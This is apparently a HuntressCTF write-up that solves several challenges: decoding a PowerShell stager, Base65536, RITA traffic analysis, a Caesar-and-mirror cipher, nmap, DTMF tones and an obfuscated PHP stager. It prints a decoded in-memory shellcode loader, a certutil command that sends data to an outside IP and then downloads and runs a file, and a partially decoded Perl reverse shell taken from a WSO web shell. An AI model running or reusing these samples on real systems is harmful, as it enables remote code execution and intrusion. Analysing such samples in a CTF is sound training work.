'CPQ0Swuz2g' + 'fZiZYMIpTJjosT5' + 'oV4' + 'OBS7I' + '8st { 0 }4RAf8HRc' + 'hPkGa+Q' + 'KSHZchP' + 'D3WdcWmRIhcTDR6' + 'GM2fVfnHhy' + '6uTOtAQ' + 'UwTGyvTVur' + 'qXKfi0+P' + 'W8sVI4WAGVwCI' + 'lQn' + 'AgeNb0 { 1 }ftv { 0 }Dxjj' + 'Q6dlh+/lvbyX' + '9/K/ { 0 }22X+XG' + 'vHr' + 'RZ0mnV635' + '0N7' + '+6d' + 'Pmob8sR' + 'bf { 0 }gc+/2j' + 'O6vT' + 'ufHt856786' + 'dO6lz { 1 }e5i' + 'e302D2/PjuxV' + 'tzFMr' + 'xqfFqP { 0 }3nQU3' + 'c1G' + '9zXmzq+' + 'YGzn4P8b' + 'iM7f' + 'Rwf85lk' + '4+Nh8w5' + '36Q1Z17P6vn7' + 'WP8h1gW2R/n+0' + 'm2g8UuZ' + 'M { 0 }M3kN7UYyHh' + 'T17M5+aw22' + 'ch1+GvZO { 0 }oc3+bF' + '+FX2jz' + 'PmifrIOWvTq' + 'nNhse' + 'D91Ba+iPwsPD' + 'D2ZlPKCx3G1M1 { 1 }W' + '+qwhS' + 'RWP+p/' + '2tS+Al6' + 'ud4' + 'Ipl5DC8H5HTl' + 'FX3C' + 'xUnB1 { 0 }qcKg3DU' + ' { 1 }x/' + 'ASIGhvQYCXR5sd' + 'mMcV+RxJzSIUP' + 'NeaOisYNO' + '5tVzNZNsBM0' + 'H9lh2HRyM' + '0 { 1 }u8 { 0 } { 0 }O7rH' + 'oKcShnVu1ut1ZD' + '7le7q+3htfj6' + 'pbX4cm3ktix' + 'FHjNwNtZZZt2s' + '0CkxjDfHC9' + '8H { 1 }unK { 0 }xB7C' + 'Tyce' + '4H0AvlOfukrCJ' + 'ucs20A' + 'i5Vt8' + 'u { 1 }R' + 'fghcHVc/Vq+' + 'D { 0 }FPQxA7' + 'c { 1 } { 1 }0q/rzFxrX0' + '+uz6TZOnIC8z/AX' + '/mDwPfb8YfVVC1a' + 'wcoCfd' + 'jzseiN/bIX' + 'DpUYmCf' + 'aRhDPKHwQtAFB' + 'tmK8gqP { 0 }gbpsWn' + 'Hspnq' + 'dxx8' + 'emlmODf2GZMc5' + '4PA' + 'AA='
H4sIAIeJG2UC/+1XbU/jOBD+3l9hrSIlkU { 0 }VFvb { 1 }IiFdWqDbPRJKS8vRbrUKyTR168TFcQplb//7jfNSygJ73 { 1 }lI94FIVvwyMx4/M7YfT9PYl5THhH7sku8VUnxdT3gRMTT/ku/fWUSjS3MzpoX7zCWHxBjby+URjzwaTw4OWqkQ { 1 }Mu8XW2DtJM { 1 }omtGITFM8he5nIGAnbPrOfiSfCfat2qb8WuPFW { 0 }rlufPgOzYcaDGTrnvKbeq/SWj0tC/ftXN8U59Uj2+ST2WGHp/nUiIqgFjukl+mGrCi/USDN2hvuAJn8rqJY13G9VBnHhTcNHaChyQMx4kulnZ { 0 } { 1 }aAT { 1 }Wcr0kZyUUMHatdwX07CAQkiW6RsTI/nkx+N8bF3 { 0 }00ljSCaieWIPiyD2JFfUiqn704YNCD6QS1+l { 0 }QOJyYJoqt+AIM { 0 }U4Zs8i/MWO4cFsi91olY1sJpbpSmBYG9Jl1OjxIGeSa+jOO5klg4pcngln5UalMy7yJvPq3o6eZs2mX3zgbAHTX6PK { 1 }ZrqHpGYRByf2JBdrbGoXIgVzsgGbaNGe/Yf1SmP1UhP1Vu0Ue8ZDToPJRn0r7tr0pj38q { 1 }ReTuIjmNIYjtaxF1G/zFPjuWjAl { 1 } { 1 }GR7UUc9 { 1 }9Qy8GIDgCBq { 1 }nFb4qKZ6oHUdUbnSbKWUBCNvHiCboFQbbfOxMHjJD78QORAhd3sYs1aa4O6CU { 0 }nb { 1 }upxdtVFIbz { 1 }vSSzSTXF7+hbpg8cgsIgdJ7QYslPJs6r+4K6TMkl9 { 0 }5GluYn5 { 1 }5zFtC0eJ1KkPgYVIbjo { 0 }8GnHlOIWOQzDaC57tOwnF5/Fo+WxxjuG7S0wnhgj8Kh { 0 }1WqCPQ0Swuz2gfZiZYMIpTJjosT5oV4OBS7I8st { 0 }4RAf8HRchPkGa+QKSHZchPD3WdcWmRIhcTDR6GM2fVfnHhy6uTOtAQUwTGyvTVurqXKfi0+PW8sVI4WAGVwCIlQnAgeNb0 { 1 }ftv { 0 }DxjjQ6dlh+/lvbyX9/K/ { 0 }22X+XGvHrRZ0mnV6350N7+6dPmob8sRbf { 0 }gc+/2jO6vTufHt856786dO6lz { 1 }e5ie302D2/PjuxVtzFMrxqfFqP { 0 }3nQU3c1G9zXmzq+YGzn4P8biM7fRwf85lk4+Nh8w536Q1Z17P6vn7WP8h1gW2R/n+0m2g8UuZM { 0 }M3kN7UYyHhT17M5+aw22ch1+GvZO { 0 }oc3+bF+FX2jzPmifrIOWvTqnNhseD91Ba+iPwsPDD2ZlPKCx3G1M1 { 1 }W+qwhSRWP+p/2tS+Al6ud4Ipl5DC8H5HTlFX3CxUnB1 { 0 }qcKg3DU { 1 }x/ASIGhvQYCXR5sdmMcV+RxJzSIUPNeaOisYNO5tVzNZNsBM0H9lh2HRyM0 { 1 }u8 { 0 } { 0 }O7rHoKcShnVu1ut1ZD7le7q+3htfj6pbX4cm3ktixFHjNwNtZZZt2s0CkxjDfHC98H { 1 }unK { 0 }xB7CTyce4H0AvlOfukrCJucs20Ai5Vt8u { 1 }RfghcHVc/Vq+D { 0 }FPQxA7c { 1 } { 1 }0q/rzFxrX0+uz6TZOnIC8z/AX/mDwPfb8YfVVC1awcoCfdjzseiN/bIXDpUYmCfaRhDPKHwQtAFBtmK8gqP { 0 }gbpsWnHspnqdxx8emlmODf2GZMc54PAAA=
```

Saved the output to tmp4.ps1 named file and replace ` { 0 }` to L, ` { 1 }` to E

```console
root@kali:~/ctf/HuntressCTF# sed -i -e 's/ { 0 }/L/g' tmp4.ps1

root@kali:~/ctf/HuntressCTF# sed -i -e 's/ { 1 }/E/g' tmp4.ps1

root@kali:~/ctf/HuntressCTF# cat tmp4.ps1 | base64 -d > tmp5.ps1.gz

root@kali:~/ctf/HuntressCTF# gunzip -d tmp5.ps1.gz
```

tmp5.ps1

```powershell
function i5P {
        Param ($cWo8x, $ip)
        $g8lN = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $g8lN.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($g8lN.GetMethod('GetModuleHandle')).Invoke($null, @($cWo8x)))), $ip))
}

function ma1_D {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $m4AK,
                [Parameter(Position = 1)] [Type] $vGu = [Void]
        )

        $fqGV5 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $fqGV5.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $m4AK).SetImplementationFlags('Runtime, Managed')
        $fqGV5.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $vGu, $m4AK).SetImplementationFlags('Runtime, Managed')

        return $fqGV5.CreateType()
}

[Byte[]]$nLQ2k = [System.Convert]::FromBase64String("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vLjEwMy4xNjMuMTg3LjEyOjgwODAvP2VuY29kZWRfZmxhZz0lNjYlNmMlNjElNjclN2IlNjQlNjIlNjYlNjUlMzUlNjYlMzclMzUlMzUlNjElMzglMzklMzglNjMlNjUlMzUlNjYlMzIlMzAlMzglMzglNjIlMzAlMzglMzklMzIlMzglMzUlMzAlNjIlNjYlMzclN2QgJVRFTVAlXGYgJiBzdGFydCAvQiAlVEVNUCVcZg==")
[Uint32]$fal3 = 0
$lc98 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualAlloc), (ma1_D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nLQ2k.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($nLQ2k, 0, $lc98, $nLQ2k.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualProtect), (ma1_D @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($lc98, [Uint32]$nLQ2k.Length, 0x10, [Ref]$fal3)) -eq $true) {
        $ubOb = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll CreateThread), (ma1_D @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lc98,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll WaitForSingleObject), (ma1_D @([IntPtr], [Int32]))).Invoke($ubOb,0xffffffff) | Out-Null
}
```

Decoded the string starting with `ICAgICAg` and URL decoded it, got flag.

```console
root@kali:~/ctf/HuntressCTF# echo -ne 'ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vLjEwMy4xNjMuMTg3LjEyOjgwODAvP2VuY29kZWRfZmxhZz0lNjYlNmMlNjElNjclN2IlNjQlNjIlNjYlNjUlMzUlNjYlMzclMzUlMzUlNjElMzglMzklMzglNjMlNjUlMzUlNjYlMzIlMzAlMzglMzglNjIlMzAlMzglMzklMzIlMzglMzUlMzAlNjIlNjYlMzclN2QgJVRFTVAlXGYgJiBzdGFydCAvQiAlVEVNUCVcZg==' | base64 -d | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));"
(snip)  certutil -urlcache -f http://.103.163.187.12:8080/?encoded_flag=flag{dbfe5f755a898ce5f2088b0892850bf7} %TEMP%\f & start /B %TEMP%\f
```

## BaseFFFF+1

### Description

> Maybe you already know about base64, but what if we took it up a notch?
>
> Download the files below.
>
> Attachments: baseffff1

### Flag

flag{716abce880f09b7cdc7938eddf273648}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file baseffff1
baseffff1: Unicode text, UTF-8 text, with no line terminators

root@kali:~/ctf/HuntressCTF# cat baseffff1
鹎驣𔔠𓁯噫谠啥鹭鵧啴陨驶𒄠陬驹啤鹷鵴𓈠𒁯ꔠ𐙡啹院驳啳驨驲挮售𖠰筆筆鸠啳樶栵愵欠樵樳昫鸠啳樶栵嘶谠ꍥ啬𐙡𔕹𖥡唬驨驲鸠啳𒁹𓁵鬠陬潧㸍㸍ꍦ鱡汻欱靡驣洸鬰渰汢饣汣根騸饤杦样椶𠌸
```

This challenge name is `BaseFFFF+1` (=65535+1) and I guess this text is Base65536 encoded.
Using [this tool](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode), got flag.

output:

```text
Nice work! We might have played with too many bases here... 0xFFFF is 65535, 65535+1 is 65536! Well anyway, here is your flag:

flag{716abce880f09b7cdc7938eddf273648}
```

## Traffic

### Description

> We saw some communication to a sketchy site... here's an export of the network traffic. Can you track it down?
>
> Some tools like rita or zeek might help dig through all of this data!
>
> Download the file below.
> Attachments: traffic.7z

### Flag

flag{8626fe7dcd8d412a80d0b3f0e36afd4a}

### Solution

Setup [rita](https://github.com/activecm/rita) in Kali:

```bash
# extract traffic.7z to logs directory
7z -ologs e traffic.7z

docker run --rm --name rita-mongo -p 27017:27017 -d mongo:4.2

# https://github.com/activecm/rita/blob/master/docs/Manual%20Installation.md
git clone https://github.com/activecm/rita.git && cd rita
make

sudo mkdir /etc/rita && sudo chmod 755 /etc/rita
sudo mkdir -p /var/lib/rita/logs && sudo chmod -R 755 /var/lib/rita
sudo chmod 777 /var/lib/rita/logs

sudo cp etc/rita.yaml /etc/rita/config.yaml && sudo chmod 666 /etc/rita/config.yaml
```

Import logs and show long connection IP address and access its URL.
Got flag.

```console
root@kali:~/ctf/HuntressCTF/rita# ./rita import ../logs test

        [+] Importing [../logs]:
        [-] Verifying log files have not been previously parsed into the target dataset ...
        [-] Processing batch 1 of 1
        [-] Parsing logs to: test ...
(snip)
        [-] Done!


root@kali:~/ctf/HuntressCTF/rita# ./rita show-long-connections test
Source IP,Destination IP,Port:Protocol:Service,Total Duration,Longest Duration,Connections,Total Bytes,State
10.24.0.2,185.199.108.153,443:tcp:- 443:tcp:ssl,5496.54,404.006,52,249194,closed
(snip)

root@kali:~/ctf/HuntressCTF/rita# ./rita show-ip-dns-fqdns test 185.199.108.153
Queried FQDN
sketchysite.github.io

root@kali:~/ctf/HuntressCTF/rita# curl -s https://sketchysite.github.io | html2text
****** sketchysite.github.io ******
flag{8626fe7dcd8d412a80d0b3f0e36afd4a}
```

## CaesarMirror

### Description

> Caesar caesar, on the wall, who is the fairest of them all?
>
> Perhaps a clever ROT13?
>
> NOTE: this flag does not follow the usual MD5 hash standard flag format. It is still wrapped with the code>flag{} prefix and suffix.
>
> Download the file(s) below.
>
> Attachments: caesarmirror.txt

### Flag

flag{julius_in_a_reflection}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file caesarmirror.txt
caesarmirror.txt: ASCII text

root@kali:~/ctf/HuntressCTF# cat caesarmirror.txt
     Bu obl! Jbj, guvf jnezhc punyyratr fher   bf V !erugrtbg ghc bg ahs sb gby n fnj
    qrsvavgryl nofbyhgryl nyjnlf ybir gelvat   ftavug rivgnibaav qan jra ch xavug bg
       gb qb jvgu gur irel onfvp, pbzzba naq   sb genc gfevs ruG !frhdvauprg SGP pvffnyp
     lbhe synt vf synt{whyvhf_ naq gung vf n   tavuglerir gba fv gv gho gengf gnret
 gung lbh jvyy arrq gb fbyir guvf punyyratr.    qan rqvu bg tavleg rxvy g'abq V
  frcnengr rnpu cneg bs gur synt. Gur frpbaq   bq hbl gho _n_av fv tnys rug sb genc
   arrq whfg n yvggyr ovg zber. Jung rknpgyl   rxnz qan leg bg reru rqhypav rj qyhbuf
     guvf svyyre grkg ybbx zber ratntvat naq   ?fravyjra qqn rj qyhbuF ?ryvujugebj
    Fubhyq jr nqq fcnprf naq gel naq znxr vg   uthbar fv fravy lanz jbU ?ynpvegrzzlf
 gb znxr guvf svyyre grkg ybbx oryvrinoyr? N    n avugvj ferggry sb renhdf qvybf
 fvzcyr, zbabfcnpr-sbag grkg svyr ybbxf tbbq   rug gn gfbzyn rj reN .rz bg uthbar
   raq? Vg ybbxf yvxr vg! V ubcr vg vf tbbq.   }abvgprysre fv tnys ehbl sb genc qevug ruG
naq ng guvf cbvag lbh fubhyq unir rirelguvat   ebs tnys fvug gvzohf bg qrra hbl gnug
    cbvagf. Gur ortvaavat vf znexrq jvgu gur   ,rpneo lyehp tavarcb rug qan kvsrec tnys
  naq vg vapyhqrf Ratyvfu jbeqf frcnengrq ol   lyehp tavfbyp n av qar bg ,frebpferqah
  oenpr. Jbj! Abj GUNG vf n PGS! Jub xarj jr   fvug bg erucvp enfrnp rug xyvz qyhbp
            rkgrag?? Fbzrbar trg gung Whyvhf   !ynqrz n lht enfrnP
```

It looks like text is encrypted.
As the challenge name includes `Caesar`, decrypted as a Caesar cipher.

```console
root@kali:~/ctf/HuntressCTF# cat caesarmirror.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
     Oh boy! Wow, this warmup challenge sure   os I !rehtegot tup ot nuf fo tol a saw
    definitely absolutely always love trying   sgniht evitavonni dna wen pu kniht ot
       to do with the very basic, common and   fo trap tsrif ehT !seuqinhcet FTC cissalc
     your flag is flag{julius_ and that is a   gnihtyreve ton si ti tub trats taerg
 that you will need to solve this challenge.    dna edih ot gniyrt ekil t'nod I
  separate each part of the flag. The second   od uoy tub _a_ni si galf eht fo trap
   need just a little bit more. What exactly   ekam dna yrt ot ereh edulcni ew dluohs
     this filler text look more engaging and   ?senilwen dda ew dluohS ?elihwhtrow
    Should we add spaces and try and make it   hguone si senil ynam woH ?lacirtemmys
 to make this filler text look believable? A    a nihtiw srettel fo erauqs dilos
 simple, monospace-font text file looks good   eht ta tsomla ew erA .em ot hguone
   end? It looks like it! I hope it is good.   }noitcelfer si galf ruoy fo trap driht ehT
and at this point you should have everything   rof galf siht timbus ot deen uoy taht
    points. The beginning is marked with the   ,ecarb ylruc gninepo eht dna xiferp galf
  and it includes English words separated by   ylruc gnisolc a ni dne ot ,serocsrednu
  brace. Wow! Now THAT is a CTF! Who knew we   siht ot rehpic raseac eht klim dluoc
            extent?? Someone get that Julius   !ladem a yug raseaC
```

Got 1st part flag: `flag{julius_`.
Reversed it.

```console
root@kali:~/ctf/HuntressCTF# cat caesarmirror.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev
 was a lot of fun to put together! I so   erus egnellahc pumraw siht ,woW !yob hO
 to think up new and innovative things   gniyrt evol syawla yletulosba yletinifed
 classic CTF techniques! The first part of   dna nommoc ,cisab yrev eht htiw od ot
 great start but it is not everything   a si taht dna _suiluj{galf si galf ruoy
 I don't like trying to hide and    .egnellahc siht evlos ot deen lliw uoy taht
 part of the flag is in_a_ but you do   dnoces ehT .galf eht fo trap hcae etarapes
 should we include here to try and make   yltcaxe tahW .erom tib elttil a tsuj deen
 worthwhile? Should we add newlines?   dna gnigagne erom kool txet rellif siht
 symmetrical? How many lines is enough   ti ekam dna yrt dna secaps dda ew dluohS
 solid square of letters within a    A ?elbaveileb kool txet rellif siht ekam ot
 enough to me. Are we almost at the   doog skool elif txet tnof-ecapsonom ,elpmis
 The third part of your flag is reflection}   .doog si ti epoh I !ti ekil skool tI ?dne
 that you need to submit this flag for   gnihtyreve evah dluohs uoy tniop siht ta dna
 flag prefix and the opening curly brace,   eht htiw dekram si gninnigeb ehT .stniop
 underscores, to end in a closing curly   yb detarapes sdrow hsilgnE sedulcni ti dna
 could milk the caesar cipher to this   ew wenk ohW !FTC a si TAHT woN !woW .ecarb
 Caesar guy a medal!   suiluJ taht teg enoemoS ??tnetxe
```

2nd part flag is `in_a_` and 3rd part is `reflection}`.
Therefore, concat these parts, got flag{julius_in_a_reflection}.

## I Wont Let You Down

### Description

> OK Go take a look at this IP:
>
> Connect here: <http://155.138.162.158>
>
> **# USING ANY OTHER TOOL OTHER THAN NMAP WILL DISQUALIFY YOU. DON'T USE BURPSUITE, DON'T USE DIRBUSTER. JUST PLAIN NMAP, NO FLAGS!**

### Flag

flag{93671c2c38ee872508770361ace37b02}

### Solution

```console
root@kali:~/ctf/HuntressCTF# nmap -p- --min-rate 5000 -Pn --open 155.138.162.158
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-05 22:05 JST
Nmap scan report for 155.138.162.158.vultrusercontent.com (155.138.162.158)
Host is up (0.21s latency).
Not shown: 63507 closed tcp ports (reset), 2024 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8888/tcp  open  sun-answerbook
42069/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.40 seconds

root@kali:~/ctf/HuntressCTF# nc 155.138.162.158 8888 | grep -i flag
flag{93671c2c38ee872508770361ace37b02}
```

## Dialtone

### Description

> Well would you listen to those notes, that must be some long phone number or something!
>
> Download the file(s) below.
>
> Attachments: dialtone.wav

### Flag

flag{6c733ef09bc4f2a4313ff63087e25d67}

### Solution

Listening to the attached `dialtone.wav` file, it sounds DTMF code.
To Decode it as DTMF code, [DTMF Decoder](https://dtmf.netlify.app/) or [DTMF detection demo](https://unframework.github.io/dtmf-detect/#/) are useful tools.

Decoded it, I got `13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573`.
Then, unhexlified it.

```python
>>> import binascii
>>> binascii.unhexlify(hex(13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573)[2:])
b'flag{6c733ef09bc4f2a4313ff63087e25d67}'
```

## PHP Stager

### Description

> Ugh, we found PHP set up as an autorun to stage some other weird shady stuff. Can you unravel the payload?
>
> Download the file(s) below.
>
> Attachments: phonetic

### Flag

flag{9b5c4313d12958354be6284fcd63dd26}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file phonetic
phonetic: PHP script, ASCII text, with very long lines (65060)
```

The attached `phonetic` file is obfuscated PHP code.

```console
root@kali:~/ctf/HuntressCTF# cp phonetic phonetic-edited.php

root@kali:~/ctf/HuntressCTF# vi phonetic-edited.php  # remove `$c = $k("/*XAjqgQvv4067*/", ` and `$c();`

root@kali:~/ctf/HuntressCTF# diff phonetic phonetic-edited.php
21,22c21
< $c = $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
< $c();
---
> echo $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302"));
26c25
<
\ No newline at end of file
---
>

root@kali:~/ctf/HuntressCTF# php phonetic-edited.php > tmp1.php
```

tmp1.php is similar to the Web Shell [wso.php](https://github.com/wsjswy/Security/blob/master/machineLearning/data/PHP-WEBSHELL/IndoXploit/wso.php).

```console
root@kali:~/ctf/HuntressCTF# curl -sLO https://raw.githubusercontent.com/wsjswy/Security/master/machineLearning/data/PHP-WEBSHELL/IndoXploit/wso.php

root@kali:~/ctf/HuntressCTF# diff tmp1.php wso.php | grep -i flag  # not found

root@kali:~/ctf/HuntressCTF# diff tmp1.php wso.php
(snip)
1459c1462
<       $back_connect_p="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==";
---
>       $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";

root@kali:~/ctf/HuntressCTF# echo -ne 'IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==' | base64 -d
#!/usr/bin/perl
use Socket;
$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
